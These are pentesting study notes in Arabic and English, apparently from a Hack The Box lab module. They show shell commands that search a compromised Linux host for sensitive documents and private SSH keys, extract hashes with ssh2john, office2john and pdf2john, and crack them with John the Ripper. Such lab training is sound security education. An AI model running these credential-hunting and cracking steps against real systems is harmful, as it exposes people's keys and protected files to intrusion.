- غالبا استخدام الfile encryption في معاملتنا مش موجود علي الناحيتين الشخصيه والمهنيه يعني كل يوم بيتبعت ايميلا لjob application و account statement وحاجات كتير من غير encryption وده يعتبر انتهاك صارخ للوائح القانونيه يعني مثلا الاتحاد الاوروبي الGDPR بيتطلب ان البيانات الشخصيه لازم تكون encrypted بين الطرفين عشان الattacker ممكن هنا يعمل intercept ويأكسس علي حاجات حساسه جدا
- طبعا شركات كتير بتسعي انها تحسن الIT security infrastrcutrue ف دايما بينصحو موظفينهم انهم يشفرو الملفات مع ان طبعا فك تشفير الملفات او كراكها موجود عادي
- الsymmetric encryption alogorithms زي AES-256 بيستخدم عشان تخزن ملفات بشكل امان او فولدرات يعني ف الحاله دي زي ما احنا عارفين بيكون معايا key للتشفير ولفك التشفير وبيكون نفس الkey
- الasymmetric encryption بقي بيكون ليه two keys هنا الsender بيشفر الملف بالpublic key بتاع المستلم ولما الملف يتنقل المستلم بيفك تشفيره بالprivate key بتاعه يعني كل المفاتيح بتوع المستلم والالجورزيم ده اقول من الsymmetric طبعا
---
## Hunting for Encrypted Files
- الملفات المتشفره ليها امتدادات كتير ومختلفه انت كا pentester بعد ما تدخل سيستم لينكس مثلا هتبدأ تدور علي الملفات اللي الموظفين مشفرينها لأن دي اكيد الملفات اللي فيها معلومات حساسه جدا
- الموقع (**FileInfo**) ده زي قاموس، لو شفت ملف بامتداد غريب، بتدخل عليه تعرف ده برنامج تشفير إيه اللي عمله
```shell-session
0xTroj6n@htb[/htb]$ for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .xls

File extension:  .xls*

File extension:  .xltx

File extension:  .od*
/home/cry0l1t3/Docs/document-temp.odt
/home/cry0l1t3/Docs/product-improvements.odp
/home/cry0l1t3/Docs/mgmt-spreadsheet.ods
...SNIP...
```
----
## Hunting for SSH keys

```shell-session
0xTroj6n@htb[/htb]$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

/home/jsmith/.ssh/id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/jsmith/.ssh/SSH.private:1:-----BEGIN RSA PRIVATE KEY-----
/home/jsmith/Documents/id_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
```

- اداة ال`ssh-keygen` بتعرفك اذا كان الssh key مشفر ولا لأ

```shell-session
0xTroj6n@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_ed25519 

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpNefJd834VkD5iq+22Zh59Gzmmtzo6rAffCx2UtaS6
```
لو مش مشفر هيطلع كده عادي ويجبلك الKey
```shell-session
0xTroj6n@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_rsa

Enter passphrase for "/home/jsmith/.ssh/id_rsa":
```
انما كده يبقي متشفر ب passphrase وطبعا هتبدأ تكراكه عادي بأي اداه زي ماعرفنا

---
## Cracking encrypted SSH keys
- زي ماعرفنا ان jtr ليها كذا اسكريبت عشان تستخرج الhashes من الفايلات
```shell-session
0xTroj6n@htb[/htb]$ locate *2john*

/usr/bin/bitlocker2john
/usr/bin/dmg2john
/usr/bin/gpg2john
/usr/bin/hccap2john
/usr/bin/keepass2john
/usr/bin/putty2john
/usr/bin/racf2john
/usr/bin/rar2john
/usr/bin/uaf2john
/usr/bin/vncpcap2john
/usr/bin/wlanhcx2john
/usr/bin/wpapcap2john
/usr/bin/zip2john
/usr/share/john/1password2john.py
/usr/share/john/7z2john.pl
/usr/share/john/DPAPImk2john.py
/usr/share/john/adxcsouf2john.py
/usr/share/john/aem2john.py
/usr/share/john/aix2john.pl
/usr/share/john/aix2john.py
/usr/share/john/andotp2john.py
/usr/share/john/androidbackup2john.py
<SNIP>
```
مثلا هنستخدم `ssh2john` هنا هيا بتعمل ايه طبعا الملف بيكون متشفر ب passphrase زي ما عرفنا فوق هنا بقي التول هتستخرج الهاش وتكراكه

```shell-session
0xTroj6n@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
0xTroj6n@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
1234         (SSH.private)
1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying
Session completed
```
We can then view the resulting hash:

```shell-session
0xTroj6n@htb[/htb]$ john ssh.hash --show

SSH.private:1234

1 password hash cracked, 0 left
```
---
## Cracking password-protected documents
- علي مدار حياتنا المهنيه هنلاقي ملفات documents كتير محمية بباسورد طب ازاي نكراكها؟ طبعا بنفس الحاجه `office2john.py` ودي بتسخدمها عشان تكراك اي ملف office سواء word او excel او ايا كان

```shell-session
0xTroj6n@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
0xTroj6n@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
0xTroj6n@htb[/htb]$ john protected-docx.hash --show

Protected.docx:1234

1 password hash cracked, 0 left
```
- وعلشان تكراك pdf مثلا بتستخدم `pdf2john`
```shell-session
0xTroj6n@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
0xTroj6n@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
0xTroj6n@htb[/htb]$ john pdf.hash --show

PDF.pdf:1234

1 password hash cracked, 0 left
```